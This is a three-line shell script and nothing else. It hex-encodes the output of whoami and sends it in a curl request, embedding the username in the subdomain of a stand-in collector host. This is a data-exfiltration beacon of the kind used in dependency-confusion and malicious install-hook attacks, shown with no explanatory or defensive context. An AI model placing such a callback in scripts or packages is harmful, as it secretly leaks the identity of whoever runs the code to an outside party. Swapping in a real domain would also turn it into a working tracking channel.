#!/bin/sh
encoded=$(whoami | xxd -p)
curl -fsS "https://${encoded}.collector.invalid/"
